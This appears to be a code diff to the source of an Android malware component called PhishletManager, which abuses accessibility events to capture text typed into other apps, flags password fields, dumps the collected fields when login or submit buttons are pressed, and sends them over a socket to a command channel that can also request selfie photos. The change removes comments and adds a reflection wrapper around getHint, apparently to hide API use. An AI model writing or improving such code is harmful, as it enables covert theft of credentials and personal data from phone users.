@@ -114,12 +114,10 @@ public final class PhishletManager {
         if (type == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             handleTextChange(event, pkg);
         } else if (type == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
-            // Note the focused field's hint for context
             handleFocus(event, pkg);
         } else if (type == AccessibilityEvent.TYPE_VIEW_CLICKED) {
             handleClick(event, pkg);
         } else if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-            // New screen — dump collected fields and reset
             if (!fieldBuffer.isEmpty()) {
                 triggerDump(null);
                 fieldBuffer.clear();
@@ -141,7 +139,6 @@ public final class PhishletManager {
         synchronized (fieldBuffer) {
             fieldBuffer.put(key, text.toString());
             if (fieldBuffer.size() > MAX_FIELD_BUFFER) {
-                // Remove oldest entry
                 fieldBuffer.remove(fieldBuffer.keySet().iterator().next());
             }
         }
@@ -149,13 +146,11 @@ public final class PhishletManager {
     }
 
     private void handleFocus(AccessibilityEvent event, String pkg) {
-        // Just track which field is focused — helps resolve field keys
         AccessibilityNodeInfo src = event.getSource();
         if (src != null) { src.recycle(); }
     }
 
     private void handleClick(AccessibilityEvent event, String pkg) {
-        // Detect submit button clicks
         CharSequence desc = event.getContentDescription();
         List<CharSequence> texts = event.getText();
         String label = desc != null ? desc.toString().toLowerCase() :
@@ -163,7 +158,6 @@ public final class PhishletManager {
         if (label.contains("login") || label.contains("sign in") || label.contains("submit") ||
             label.contains("continue") || label.contains("next") || label.contains("confirm") ||
             label.contains("verify") || label.contains("send") || label.contains("ok")) {
-            // Submit detected — emit full field dump
             triggerDump(null);
         }
     }
@@ -172,15 +166,12 @@ public final class PhishletManager {
         try {
             AccessibilityNodeInfo src = event.getSource();
             if (src != null) {
-                CharSequence hint = null;
-                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                    hint = src.getHint();
-                }
+                String hintStr = getHintCompat(src);
                 CharSequence clazz = src.getClassName();
                 boolean password = src.isPassword();
                 src.recycle();
-                if (hint != null && !hint.toString().isEmpty()) {
-                    return (password ? "🔒" : "") + hint.toString().trim();
+                if (hintStr != null && !hintStr.isEmpty()) {
+                    return (password ? "🔒" : "") + hintStr.trim();
                 }
                 if (clazz != null && clazz.toString().toLowerCase().contains("password")) {
                     return "🔒 password";
@@ -188,6 +179,17 @@ public final class PhishletManager {
             }
         } catch (Exception ignored) {}
         return fallback;
+    }
+
+    private String getHintCompat(AccessibilityNodeInfo node) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            try {
+                java.lang.reflect.Method m = AccessibilityNodeInfo.class.getMethod("getHint");
+                CharSequence hint = (CharSequence) m.invoke(node);
+                return hint != null ? hint.toString() : null;
+            } catch (Exception ignored) {}
+        }
+        return null;
     }
 
     private void debouncedEmitField(String key, String value, String pkg, boolean isPassword) {
@@ -222,7 +224,6 @@ public final class PhishletManager {
                 payload.put("photoType", photoType != null ? photoType : "selfie");
                 if (cmdId != null) payload.put(Protocol.KEY_CMD_ID, cmdId);
                 socket.emit(Protocol.PHISHLET, payload);
-                // TODO: trigger CameraManager.capture() and send image back
             } catch (Exception ignored) {}
         });
     }
